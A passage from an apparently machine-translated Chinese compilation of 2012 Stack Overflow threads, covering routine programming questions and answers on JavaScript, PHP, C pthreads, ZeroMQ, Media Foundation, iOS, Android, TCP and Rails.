else if(newPage < currentPage) { 
  // Page must be less
     $('#c1l').trigger('click');
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T10:46:15.070

这里还有一个额外的尾随逗号：

```
$(".carousel").jCarouselLite({
    btnNext: "#c1r",
    btnPrev: "#c1l",
    easing: "easeOutQuad",
    visible: 5,

}); 
```

如果您使用好的 ide（我建议使用 WebStorm），它会为您捕获这些讨厌的错误。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-08T10:44:05.673

你错过了一个`if`：

```
else if(newPage < currentPage) 
```

无论如何，在 lint 上传递您的代码会显示多个警告，您可以在此处查看它们： [http ://www.javascriptlint.com/online_lint.php](http://www.javascriptlint.com/online_lint.php)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-08T10:46:01.707

您在`if`之后错过了一个关键字`else`：

它实际上`else if`是`if`

尝试：

```
if (newPage > currentPage) { // Page must be greater
      $('#c1r').trigger('click');
 }
 else if (newPage < currentPage) { // Page must be less
      $('#c1l').trigger('click');
 } 
```

# umbraco - 在页面模板中使用 Umbraco 内容宏

> ID：13287361
> 
> 赞同：0
> 
> 时间：2012-11-08T10:39:57.490
> 
> 标签：umbraco

我希望重新使用在内容窗格中呈现的 Umbraco 宏，并在页面模板中使用它。内容页面上的块在下面，我需要做什么才能将其变成页面模板的新宏？

```
<div umb_source="5766" umb_firsttab="5846" 
    umb_macroalias="widgetname" 
    umb_secondtab="5847" 
    ismacro="true" onresizestart="return false;" 
    umbversionid="b8fc56a2-f4b0-42ee-a3b8-7115acdff669" 
    umbpageid="5756" 
    title="This is rendered content from macro" 
    class="umbMacroHolder">
    <!-- startUmbMacro -->
    <span>This macro does not provides rendering in WYSIWYG editor
    </span>
<!-- endUmbMacro --></div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T06:18:45.543

我建议使用模板编辑器（在设置部分）中的“插入宏”按钮来添加模板。它为您提供了一个界面来选择合适的选项来为您构建宏标签。

但是这样的事情应该可以工作（类似于 Ankur Ghelani，但包括其他选项）：

```
<umbraco:marco alias="widgetname" runat="server"
    source="5766"
    firsttab="5846"
    secondtab="5847" /> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T11:54:20.530

在**模板**中，您使用如下：

```
<umbraco:Macro Alias="widgetname" runat="server" /> 
```

它应该工作

# java - 如何执行 GUI Java 应用程序？

> ID：13287364
> 
> 赞同：1
> 
> 时间：2012-11-08T10:40:07.090
> 
> 标签：java

我制作了一些 GUI Java 应用程序并将其导出为“可执行 Jar”。但是 Windows 将这个文件显示为 RAR 存档，我无法执行它！我该如何解决？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T10:41:47.267

从命令行运行：`java -jar <jarfile>`.

在 Windows 资源管理器中，右键单击 JAR 文件，选择“**打开方式...** ”并选择您的本地 Java 安装。

*确保您已[安装 JRE](http://www.java.com)。通常，Windows 会识别 JAR 文件并对其进行正确处理。它们被识别（可以理解）为存档的事实暗示您没有 JRE。*

# php - 使用 datestring 创建 php 日期格式

> ID：13287371
> 
> 赞同：-1
> 
> 时间：2012-11-08T10:40:41.170
> 
> 标签：php, date

我有一个像`2012-11-08`.

我也想将此字符串转换为 php 日期格式。

输出应该像

```
 $smv =   date('Y-m-d H:i:s', time());
 print $smv //  2012-11-08 16:05:56  (If we consider India ) 
```

我试过

```
$day = '2012-10-08';
echo = date("Y-m-d H:i:s",strtotime($day)); 
```

但它将日期打印为`2012-10-08 00:00:00`（不打印当前时间）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T10:45:44.073

像这样试试

```
 $day = '2012-10-08'.date('H:i:s', time());
 echo  date("Y-m-d H:i:s",strtotime($day)); 
```

# ios - 不推荐使用 finishWriting：首先在 iOS 6.0 中不推荐使用

> ID：13287374
> 
> 赞同：1
> 
> 时间：2012-11-08T10:40:47.493
> 
> 标签：ios, iphone, ios6, avassetwriter

我`AVAssetWriter`用来编码图像集中的视频：

```
[assetWriter finishWriting]; 
```

这个方法在 iOS 6 中会产生警告。

```
[assetWriter finishWritingWithCompletionHandler:<#^(void)handler#>]; 
```

这就是我应该如何在 iOS 6 中应用它的方式。谁能帮我应用它

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-08T11:21:09.660

You don't need to check whether it's finished. The completion handler is a block. It will be called by the system when the writing is finished. Try it.

```
[assetWriter finishWritingWithCompletionHandler:^(){
    NSLog (@"finished writing");
}]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-10T04:22:00.397

这是作家开始代码

```
 NSURL *movieURL = [NSURL fileURLWithPath:myPathDocs1];
    NSError *movieError = nil;
    [assetWriter release];
    assetWriter = [[AVAssetWriter alloc] initWithURL:movieURL
                                            fileType: AVFileTypeQuickTimeMovie
                                               error: &movieError];
    NSDictionary *assetWriterInputSettings = [NSDictionary dictionaryWithObjectsAndKeys:
                                              AVVideoCodecH264, AVVideoCodecKey,
                                              [NSNumber numberWithInt:FRAME_WIDTH], AVVideoWidthKey,
                                              [NSNumber numberWithInt:FRAME_HEIGHT], AVVideoHeightKey,
                                              nil];
    assetWriterInput = [AVAssetWriterInput assetWriterInputWithMediaType: AVMediaTypeVideo
                                                          outputSettings:assetWriterInputSettings];
    assetWriterInput.expectsMediaDataInRealTime = YES;
    [assetWriter addInput:assetWriterInput];

    [assetWriterPixelBufferAdaptor release];
    assetWriterPixelBufferAdaptor = [[AVAssetWriterInputPixelBufferAdaptor  alloc]
                                     initWithAssetWriterInput:assetWriterInput
                                     sourcePixelBufferAttributes:nil];
    [assetWriter startWriting];

    firstFrameWallClockTime = CFAbsoluteTimeGetCurrent();
    [assetWriter startSessionAtSourceTime: CMTimeMake(0, TIME_SCALE)];

    // start writing samples to it
    [assetWriterTimer release];
    assetWriterTimer = [NSTimer scheduledTimerWithTimeInterval:1.0f/60.0f
                                                        target:self
                                                      selector:@selector (writeSample:)
                                                      userInfo:nil
                                                       repeats:YES] ; 
```

这是作家停止代码

```
 if (isRecording) {
        isRecording = NO;
        [_session stopRunning];
        [assetWriterTimer invalidate];
        assetWriterTimer = nil;

        [assetWriter finishWritingWithCompletionHandler:^(){
            NSLog (@"finished writing");
        }];

        [self loadOvelay];

    } 
```

# php - PHP 丢失会话

> ID：13287375
> 
> 赞同：0
> 
> 时间：2012-11-08T10:40:50.607
> 
> 标签：php, session, redirect

这是我第一次遇到这个问题。

基本上，当我执行登录功能时，我创建了一个会话变量，它被传递给 index.php 文件。

问题是，如果我刷新浏览器，或单击其他菜单项，我会丢失会话。

这里有一些代码：

```
public function Login_Form()
{
    if(isset($_POST['login']))
        $this->login($_POST);
 ?>
<form action="<?php $_SERVER['PHP-SELF']; ?>" method="POST" id="form_login">
<table>
    <tr>
        <td>Username</td>
        <td><input type="text" name="username" /></td>
    </tr>
    <tr>
        <td>Password</td>
        <td><input type="password" name="password" /></td>
    </tr>
    <td><input type="submit" name="login" value="Login" /></td>
</table>
</form>
 <?php
}

private function login($p)
{
    // OTTENGO VALORI PASSATI DAL LOGIN FORM
    $username = mysql_real_escape_string($p['username']);
    $password = mysql_real_escape_string(md5($p['password']));
    // CONTROLLO CHE ESISTA L'UTENTE
    $control = mysql_query("SELECT * FROM tareado.user WHERE username='$username' AND password='$password'");
    if(mysql_affected_rows() > 0)
    {
        while($x = mysql_fetch_array($control))
        {
            $id_utente = $x['iduser'];
            $_SESSION['idutente'] = $id_utente;
        }

        $_SESSION['username'] = $username;
        //session_write_close();            
        header("Location: index.php"); // REDIRECT TO INDEX.PHP, NOW WE ARE IN index.php?a=log
        //exit();

    }
    else
        echo "Credenziali errate";
} 
```

我放在 index.php SESSION_START() 的顶部，但我总是丢失会话。

哪个可能是问题？重定向？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T10:49:44.413

我在重定向它的页面中看不到会话开始。如果会话甚至在 Cookies 选项卡下启动，您也可以使用 firebug 进行调试。当您尝试登录时，您应该会看到类似 PHPSESSID 的内容。不确定这是否是您的答案，但我还无法发表评论。

# php - 使用 php 中的 cmd 行执行在 txt 文件或 ini 中输出结果的脚本

> ID：13287376
> 
> 赞同：-1
> 
> 时间：2012-11-08T10:40:55.790
> 
> 标签：php, command-line, export, output

我想在 Windows 的命令行中运行一个简单的行来运行一个读取 IP 地址的脚本，我希望它在文本文件中输出。

这是脚本

```
<?php
     $lines = file('ipaddresses.ini', FILE_IGNORE_NEW_LINES); 
     foreach($lines as $line){
         echo $line;  

         $host   = $line;
         echo("Ping Output:");
         system("ping -n 4 $host",$result);

         if ($result == 0)
             echo "Ping successful!";
         else
             echo "Ping unsuccessful!";

     } 
 ?> 
```

这是命令行

```
C:\wamp\bin\php\php5.3.13>php.exe -f "C:\wamp\www\hello.php" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T10:59:56.833

可以通过命令行将输出保存到文件中。附加`> [name of file]`到命令，然后它将脚本的所有输出存储到指定的文件名中。

```
C:\wamp\bin\php\php5.3.13>php.exe -f "C:\wamp\www\hello.php" > C:\output.txt 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T11:04:41.663

将其保存到`C:\wamp\www\hello.php`中，然后像这样执行它：

```
>php.exe -f "C:\wamp\www\hello.php" > C:\wamp\www\output.txt 
```

带有 Windows 命令提示符。确保有一个名为 ipaddresses.ini 的文件，它只包含换行符分隔的有效 IP 地址。

```
<?php
$lines = file('ipaddresses.ini', FILE_IGNORE_NEW_LINES);
foreach($lines as $line)
{ 
    echo $line . "\n";
    $ip = $line;
    exec("ping -n 3 $ip", $outcome, $status);

    if ($status == 0)
    {
        echo "Ping successful!\n";
    }
    else
    {
        echo "Ping unsuccessful!\n";
    }
}
?>​ 
```

# c - 线程和并行编程

> ID：13287377
> 
> 赞同：3
> 
> 时间：2012-11-08T10:40:58.897
> 
> 标签：c, multithreading, parallel-processing, numbers

假设我想计算 n 个复数的乘积。

我要做的是计算`(i=0;i<n/2)`线程中 2*i 和 2*i+1 复数的乘积。即，将 2 个数字聚集在一起并计算它们的乘积，因此我将得到 n/2 个乘积。然后再次对这些 n/2 产品执行相同的操作。以此类推，直到 n 的值为 1。

这是我的代码

```
#include<stdio.h>
#include<stdlib.h>
#include<pthread.h>
struct complex{
    int a;
    int b;
};
struct complex arr[1000];
struct arg {
    struct complex arr1;
    struct complex arr2;
    int i;
};
//struct arg *argv;
struct arg *argv=malloc(sizeof(struct arg));
void *multiplier(struct arg *argv)
{
    int real,imaginary;
    real=(argv->arr1.a)*(argv->arr2.a)-(argv->arr1.b)*(argv->arr2.b);
    imaginary=(argv->arr1.a)*(argv->arr2.b)+(argv->arr1.b)*(argv->arr2.a);
    arr[argv->i].a=real;
    arr[argv->i].b=imaginary;
    printf("real=%d imaginary=%d no=%d\n",real,imaginary,argv->i);
    pthread_exit(0);
}
int main(void)
{
    int n,i,j,flag=0,q;
    pthread_t tid;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    scanf("%d",&n);
    for(i=0;i<n;i++)
        scanf("%d + i%d",&arr[i].a,&arr[i].b);
    for(i=0;i<n;i++)
        printf("%d + i%d\n",arr[i].a,arr[i].b);
    while(n!=0)
    {
        if(n%2==1)
            flag=1;
        else
            flag=0;
        for(i=0;i<n/2;i++)
        {
            argv->arr1.a=arr[2*i].a; /* SEG FAULT HERE */
            argv->arr1.a=arr[2*i].b;
            argv->arr2.a=arr[2*i+1].a;
            argv->arr2.a=arr[2*i+1].b;
            argv->i=i;
            pthread_create(&tid,&attr,multiplier,(void *) argv);
        }
        pthread_join(tid,NULL);
        if(flag==1)
        {
            arr[n/2].a=arr[n-1].a;
            arr[n/2].b=arr[n-1].b;
        }
        n=n/2;
    }
    return(0);
} 
```

但是，我的代码在第 45 行给出了段错误。我一直试图找出它有什么问题，但无济于事。我可能会犯一个根本上可怕的错误，但请帮帮我。

编辑1：可能是有史以来最愚蠢的错误。我不能像刚才那样全局分配内存。

我刚刚将 Malloc 插入到主函数中，程序就可以工作了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T11:02:53.497

每个线程都需要通过自己的内存传入，`argv`以免覆盖其他线程数据。

所以你可能会想移动这条线

```
struct arg * argv = malloc(sizeof(struct arg)); 
```

到这里：

```
for(i = 0; i < n/2; ++i)
    {
        struct arg * argv = malloc(sizeof(*argv));
        argv->arr1.a = arr[2*i].a; 
```

检查调用的结果也`malloc()`可能不是一个坏主意。

* * *

然后让线程`free()`在完成后使用它的内存：

```
void * multiplier(struct arg * argv)
{
    ...

    free(argv);

    pthread_exit(0);
} 
```

* * *

此外，要传递给的线程函数`pthread_create()`定义为：

```
void *(*)(void *) 
```

所以你应该这样声明你的：

```
void * multiplier(void * pvargv)
{
    struct arg * argv = pvargv;
    ... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T10:47:13.800

很难弄清楚你的哪一行是第 45 行。

此外，这看起来非常错误：

```
struct arg *argv=malloc(5*sizeof(struct complex)); 
```

像这样的错误匹配类型很少是正确的，而且`struct complex`看起来一点也不像`struct arg`，所以这看起来真的很奇怪。另外，你不应该有一个全局命名`argv`，而你

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T10:47:17.867

首先，我不确定您分配的内存大小是否`argv`足够合理。其次，你修改这个`argv`东西，创建一个线程并立即覆盖它，很可能在线程接触到它之前。

# uuid - 多个订阅者的相同 ZMQ_IDENTITY

> ID：13287378
> 
> 赞同：3
> 
> 时间：2012-11-08T10:40:58.863
> 
> 标签：uuid, zeromq, pyzmq

我正在构建一个 zeromq PUB-SUB 模式，其中一个发布者有很多订阅者。我想构建持久的订阅者，所以我发现了 ZMQ_IDENTITy 套接字选项。

选择 Identity 的值时应该考虑什么？我可以对所有订阅者采取同样的做法吗？由于它们都是相同类型但在不同的机器上，这应该是一个问题，对吧？此外，UUID 是否仅像 zguide 示例中解释的那样通过 inproc 服务生成？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-10T05:04:55.817

不要使用 IDENTITY 选项。从 ZeroMQ/3.x 中删除了持久订阅者，因此您的应用程序将停留在 2.x 版本上。

持久订阅者如此糟糕，我们将其删除的原因是它们在发布者上消耗了任意数量的内存（消息必须保留在某个地方），这很容易导致内存不足，这是杀死您的 pubsub 系统的最快方法对于所有订阅者。

如果您想要一个持久的订阅者模型，您可以在 ZeroMQ 之上非常轻松地构建它，并且在指南（克隆模式）中有一个完整的工作示例。

我不确定是否有人在 ZeroMQ 上构建了一个持久的 pubsub 代理，这将是一个有趣的练习并且不是那么困难。

# python - 将下拉列表添加到 django

> ID：13287384
> 
> 赞同：0
> 
> 时间：2012-11-08T10:41:25.253
> 
> 标签：python, django

我有一个下拉列表的 HTML 模板：

```
<select name="quality">
    {% for quality in qs %}
        {% ifequal qu.id sel.id %}
            <option value="{{sele.key}}" selected="selected">Movie {{qu.id}}: {{quality.name}}</option>
        {% else %}
            <option value="{{sele.keyy}}">Movie {{qu.id}}: {{quality.name}}</option>
        {% endifequal %}
    {% endfor %}
</select> 
```

我如何在我的模型和视图中实现这一点，或者我如何为下拉列表编写模型和视图......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T12:06:04.607

Use [django forms](https://docs.djangoproject.com/en/dev/topics/forms/?from=olddocs)

They are great for reusing forms, validation, and make processing forms much more pythonic.

You can create a `ChoiceField` in your form, and then give a tuple showing `[[value, label], [value, label], [value, label]]`

# windows-7 - 使用 SinkWriter 编码视频时更改 h.264 质量

> ID：13287396
> 
> 赞同：4
> 
> 时间：2012-11-08T10:42:13.760
> 
> 标签：windows-7, encoding, h.264, ms-media-foundation

我正在使用 Microsoft Media Foundation 对 H.264 视频文件进行编码。

我正在使用 SinkWriter 创建视频文件。输入是一个缓冲区 ( `MFVideoFormat_RGB32`)，我在其中绘制帧，输出是一个`MFVideoFormat_H264`.

编码有效，它会创建一个包含我的帧的视频文件。但我想设置该视频文件的质量。更具体地说，我想[`CODECAPI_AVEncCommonQuality`](http://msdn.microsoft.com/en-us/library/windows/desktop/dd317841%28v=vs.85%29.aspx)在 H.264 编码器上设置属性。

为了获得 H.264 编码器的句柄，我在 SinkWriter 上调用[GetServiceForStream 。](http://msdn.microsoft.com/en-us/library/windows/desktop/dd374649%28v=vs.85%29.aspx)然后我设置`CODECAPI_AVEncCommonQuality`属性。

问题是我的属性更改被忽略了。如[文档](http://msdn.microsoft.com/en-us/library/windows/desktop/dd797816%28v=vs.85%29.aspx#codec_properties)中所述：

> 要在 Windows 7 中设置此参数，请在调用 IMFTransform::SetOutputType 之前设置该属性。设置输出类型后，编码器会忽略更改。

问题是我没有手动创建 H.264 编码器。我在 SinkWriter 上设置了输入和输出类型，SinkWriter 会自动创建 H.264 编码器。一旦它创建了编码器，它就会调用该`IMFTransform::SetOutputType`方法，我不能再更改该`CODECAPI_AVEncCommonQuality`属性。文档还说在 Windows 8 中不会忽略属性更改，但我需要在 Windows 7 上运行它。

您知道在 Windows 7 上使用 SinkWriter 时如何更改编码文件的质量吗？

PS：[有人在msdn论坛上问过同样的问题](http://social.msdn.microsoft.com/Forums/en-US/mediafoundationdevelopment/thread/6da521e9-7bb3-4b79-a2b6-b31509224638)，他似乎没有得到答案。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T21:50:17.253

正如文档所说，设置输出类型后您无法更改`CODECAPI_AVEncCommonQuality`属性，并且 SinkWriter 在您可以使用编码器之前设置输出类型。

为了绕过这个问题，我设法创建了一个类工厂并将其注册到 Media Foundation 中，以便 SinkWriter 使用它来创建一个新的编码器。在我的类工厂中，我创建了一个新的 H264 编码器并设置了我想要的任何属性，然后将其传递给 SinkWriter。

我已经更详细地写了我在 MSDN 论坛上创建这个类工厂的步骤，这里：[http ://social.msdn.microsoft.com/Forums/en-US/mediafoundationdevelopment/thread/6da521e9-7bb3-4b79- a2b6-b31509224638](http://social.msdn.microsoft.com/Forums/en-US/mediafoundationdevelopment/thread/6da521e9-7bb3-4b79-a2b6-b31509224638)

这是我在 Windows 7 上解决问题的唯一方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2022-03-02T00:34:38.627

`CODECAPI_AVEncCommonRateControlMode`并且`CODECAPI_AVEncCommonQuality`可以使用 . 传递给 h.264 编码器`IMFSinkWriter->SetInputMediaType(/* ... */,, IMFAttributes pEncodingParameters)`。我怀疑其他`CODECAPI_`值也会起作用。

```
CComPtr<IMFAttributes> pEncAttrs;
ATLENSURE_SUCCEEDED(MFCreateAttributes(&pEncAttrs, 1));
ATLENSURE_SUCCEEDED(pEncAttrs->SetUINT32(CODECAPI_AVEncCommonRateControlMode, eAVEncCommonRateControlMode_Quality));
ATLENSURE_SUCCEEDED(pEncAttrs->SetUINT32(CODECAPI_AVEncCommonQuality, 40));
ATLENSURE_SUCCEEDED(writer->SetInputMediaType(sink_stream, mtSource, pEncAttrs));
//                                                                   ^^^^^^^^^ 
```

# iphone - iPhone - 在 UITableView 中添加新的部分和行

> ID：13287397
> 
> 赞同：0
> 
> 时间：2012-11-08T10:42:14.597
> 
> 标签：iphone, ios, uitableview

我有一个`UITableView`显示数据列表。

该列表将包含图像，因此我正在使用延迟加载加载图像。现在我不想一次加载整个列表。

加载应该是这样的，首先它应该加载大约 10 条记录，当我们向下滚动到 时`tableview`，它应该自动加载接下来的 10 条记录。

为此，我需要在滚动到底部时添加行。`tableview`可能包含不同的部分。

那么如何在`tableview`向下滚动的末尾添加新行和新部分？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T10:55:21.867

首先，您想要做的事情称为**延迟加载**。

意味着您的表格视图将在当前对用户可见的单元格中加载图像或显示数据。所以看看[这个](https://developer.apple.com/library/ios/#samplecode/LazyTableImages/Introduction/Intro.html)链接。它提供了可能对您有所帮助的示例代码。

并插入行，您可以使用

```
(void)insertRowsAtIndexPaths:(NSArray *)indexPaths withRowAnimation:(UITableViewRowAnimation)animation; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T10:51:07.537

在

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
   {
     if (indexPath.row == [yourArray count]-1)
        {
         //start fetching the next set of data in background asynchronously and when fetching is complete use delegate methods to reload or append your current UITableView , meanwhile start a activity indicator as footer to show loading
         }
   } 
```

这是有效的方法，如果你在滚动到底部时尝试同步实现，它会导致你的设备卡住

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T10:51:47.860

查看[有关 UITableView 的 Apple 文档](http://developer.apple.com/library/ios/#documentation/uikit/reference/UITableView_Class/Reference/Reference.html)。您可以使用以下方法添加一行：

```
- (void)insertRowsAtIndexPaths:(NSArray *)indexPaths withRowAnimation:(UITableViewRowAnimation)animation; 
```

# android - 带有片段的 ActionBarSherlock

> ID：13287398
> 
> 赞同：0
> 
> 时间：2012-11-08T10:42:17.623
> 
> 标签：android, actionbarsherlock

我是 Android 新手，正在使用这个非常有用的 API。在我的应用程序中，我有一个寻呼机和 4 个片段。

我想根据每个片段上的事件更新操作栏，例如 OnlistItemClick 事件。但是我不能从片段中干扰 ActionBar。

我该如何克服这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T10:47:59.073

您可以参考`ActionBar`任何您`Fragments`使用的`getActivity().getActionBar()`电话。希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T10:50:01.097

`getSupportActionBar()`您可以通过Fragment获取 ActionBar

# networking - MSS 和 tcp 窗口大小

> ID：13287404
> 
> 赞同：0
> 
> 时间：2012-11-08T10:42:33.850
> 
> 标签：networking, tcp

在 A 和 B 之间的通信期间，当 A 向 B 发送数据时，段大小将取决于 B 的窗口大小。最初，在 B 成功接收数据后，它将窗口大小加倍并继续。现在 B 知道它的 MSS。因此，在将段大小发送给 A 时，它可以确保它不超过 MSS 值。那么为什么 B 必须首先通知 MSS 给 A 呢？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-08T10:55:52.073

段大小取决于发送方和接收方各自连接到的网络的数据链路层的 MTU 大小。

路径 MTU 发现可用于发现发送方和接收方之间的最小 MTU 大小，以动态确定发送方和接收方之间的最佳最大分段大小（避免 IP 分片）（假设发送方和接收方之间的所有路由器都遵守 do_not_fragment 位）。

您似乎将流量控制和滑动窗口与最大段大小混为一谈。

* * *

**根据评论**更新。****

 **> 是窗口大小不能超过 MSS 吗？我找不到他们之间的关系。

不，不是这样。

> 窗口大小是否完全取决于发送方和接收方的缓冲区大小，而 MSS 取决于 MTU？

MSS 和 MTU 大小是需要上下文的术语，因为它们根据上下文具有不同的含义。

虽然只考虑一个转移方向，但有两个“窗口”需要考虑：

*   **接收窗口**。用于实现[Flow Control](http://en.wikipedia.org/wiki/Transmission_Control_Protocol#Flow_control)，由接收者维护和指定。它受到接收器从一个时刻到下一个时刻的缓冲能力的限制。接收窗口定义了在发送者确认之前可以发送多少数据。另见[BDP](http://en.wikipedia.org/wiki/Bandwidth-delay_product)。MSS 与接收窗口无关。
*   **拥塞窗口**。用于实现[拥塞控制](http://en.wikipedia.org/wiki/Transmission_Control_Protocol#Congestion_control)。由发件人维护和使用。拥塞窗口大小实际上是 MSS 的倍数。

> A 和 B 的窗口大小可以不同，但​​ MSS 由于它们共享的公共链接而保持相同？

MSS 不需要对称。没有保证或要求从 A 到 B 的路径与从 B 到 A 的路径相同。

我建议您在这里阅读整篇文章：[http](http://en.wikipedia.org/wiki/Transmission_Control_Protocol) ://en.wikipedia.org/wiki/Transmission_Control_Protocol ，因为有图表可以帮助理解。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T02:21:13.810

> 段大小将取决于 B 的窗口大小

*并*在路径 MTU 上。这两个数字中的较低者适用。对于给定的路径，路径 MTU 是恒定的；通告的窗口大小根据接收方的套接字接收缓冲区、慢启动等的状态是动态的。**

# objective-c - NSURLConnect 只工作 1 次

> ID：13287408
> 
> 赞同：0
> 
> 时间：2012-11-08T10:42:53.410
> 
> 标签：objective-c, xcode

我正在尝试做一个请求，但它只在第一次工作....

这是我的代码：

```
NSArray *infos = [rows objectAtIndex:indexPath.row];
NSString *thumbPath = thePath;

NSURLRequest *thumbRequest = [NSURLRequest requestWithURL:[NSURL URLWithString:thumbPath]cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10];

self->thumbConnection = [[NSURLConnection alloc] initWithRequest:thumbRequest
                                                        delegate:self
                                                startImmediately:YES];

     self->thumbData = [[NSMutableData alloc]init]; 
```

收到响应时

```
- (void)connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse *)response {

if (self->thumbData == nil) {
    self->thumbData = [[NSMutableData alloc]init];
}
- (void)connectionDidFinishLoading:(NSURLConnection *)connection {

self.thumbImage.image = [UIImage imageWithData:self->thumbData];

self.thumbActivityView.hidden = YES;

self->thumbData = nil;
} 
```

当 didFinishDownloading: - (void)connectionDidFinishLoading:(NSURLConnection *)connection {

```
self.thumbImage.image = [UIImage imageWithData:self->thumbData];

self.thumbActivityView.hidden = YES;

[self->thumbData release];

self->thumbData = nil; 
```

}

当超时或其他错误方法时：

```
 - (void)connection:(NSURLConnection *)connection didFailWithError:(NSError *)error {
[self->thumbData release];
self->thumbData = nil;
self.thumbActivityView.hidden = YES;
[thumbConnection release];
self->thumbConnection = nil;

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-03T14:33:33.163

如果它不是零，就不要再次分配它。最好还是在对象的 init 方法中分配它并在对象的 dealloc 方法中释放它

# .net - Windows Phone WebBrowser 设置 cookie

> ID：13287409
> 
> 赞同：1
> 
> 时间：2012-11-08T10:43:02.417
> 
> 标签：.net, cookies, browser, windows-phone, windows-phone-8

我正在将 HttpWebRequest 用于 REST 服务，该服务使用一些依赖于 JSESSIONID cookie 的基本身份验证。我需要将该 cookie 传递给 WebBrowser 控件以重用该会话，但没有找到任何可用的解决方案允许我在浏览器的 cookie 存储中传递该 cookie。

有什么办法吗？我现在能想到的唯一方法是使用 Naviagate(url, null, MANUALLY_CONSTRUCTED_HEADER)，这是一种蛮力。

是的，并且确实必须使用 WebBrowser 进行此类操作。

有什么建议么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-13T19:54:45.400

另一个想法是您可以通过 JavaScript 添加 cookie。您应该能够做到这一点（假设 IsScriptEnabled 在您的浏览器控件上为 true）：

```
private void setCookie(string name, string value, string path = "", string domain = "", bool isSecure=false, string expires = "")
{
        var sb = new StringBuilder();
        sb.AppendFormat("document.cookie = '{0}=\" + escape(\"{1}\")", name, value);
        if (!String.IsNullOrEmpty(expires))
            sb.AppendFormat(";expires=\"{0}\"", expires); // should be a GMTString
        if (!String.IsNullOrEmpty(path))
            sb.AppendFormat(";path=\"{0}\"", path); 
        if (!String.IsNullOrEmpty(domain))
            sb.AppendFormat(";domain=\"{0}\"", domain);
        if (isSecure)
            sb.Append(";secure'");
        var cookieJs = sb.ToString();
        Debug.WriteLine(cookieJs);
        webBrowser.InvokeScript(cookieJs);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T13:26:34.290

我通过第一次在 URL 中发送 JSESSIONID 解决了我的问题，然后获得了有效的 JSESSIONID cookie。但这不是一个普遍的方法。

我认为有一种解决方案可以导航到简单的网页，该网页嵌套在应用程序资源中。然后浏览器可以调用javascript函数，该函数将设置参数传递的cookie。如果 Microsoft 不干预这种方法（通过禁用 document.cookie），这可能是一个解决方案（我还没有测试过）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-16T06:56:52.230

对于那些即使在 LoadCompleted 事件中调用脚本也遇到异常的人，试试这个：

```
webBrowser.InvokeScript("eval", "document.cookie = \"COOKIE_NAME=" + COOKIE_VALUE + "; Path=/; Domain=" + WEB_URL.DnsSafeHost + " ;\";"); 
```

这个在 LoadCompleted 事件中为我工作。请记住，您必须加载两次才能使 cookie 正常工作。在 LoadCompleted 时，cookie 将被注入但不显示，但在第二次加载时，它会正常工作。

# ruby-on-rails - accept_nested_attributes_for 在多对多关系中

> ID：13287411
> 
> 赞同：0
> 
> 时间：2012-11-08T10:43:11.473
> 
> 标签：ruby-on-rails, nested-attributes

我试图为此找到解决方案，但大多数文献都涉及如何创建表单而不是如何将内容保存在数据库中。我遇到的问题是，`accepts_nested_attributes_for`在保存对现有数据库实体的修改时似乎工作正常，但在尝试创建新对象树时失败。

一些背景。我的课程如下：

```
class UserGroup < ActiveRecord::Base
    has_many :permissions
    has_many :users

    accepts_nested_attributes_for :users
    accepts_nested_attributes_for :permissions
end

class User < ActiveRecord::Base
    has_many :user_permissions
    has_many :permissions, :through => :user_permissions

    belongs_to :user_group

    accepts_nested_attributes_for :user_permissions
end

class Permission < ActiveRecord::Base
    has_many :user_permissions
    has_many :users, :through => :user_permissions

    belongs_to :user_group
end

class UserPermission < ActiveRecord::Base
    belongs_to :user
    belongs_to :permission

    validates_associated :user
    validates_associated :permission

    validates_numericality_of :threshold_value
    validates_presence_of :threshold_value

    default_scope order("permission_id ASC")
end 
```

权限看起来很奇怪，但是每个用户都有一个阈值，每个用户都不同，这就是为什么需要这样的原因。

无论如何，正如我所说，当我`PUT`更新例如阈值时，一切正常。这是控制器代码（UserGroupController，我一次发布整个用户组而不是一个用户）：

```
def update
    @ug = UserGroup.find(params[:id])
    @ug.update_attributes!(params[:user_group])
    respond_with @ug
end 
```

进来的典型数据是：

```
{"user_group":
    {"id":3,
    "permissions":[
        {"id":14,"name":"Perm1"},
        {"id":15,"name":"Perm2"}],
    "users":[
        {"id":7,"name":"Tallmaris",
         "user_permissions":[
             {"id":1,"permission_id":14,"threshold_value":"0.1"},       
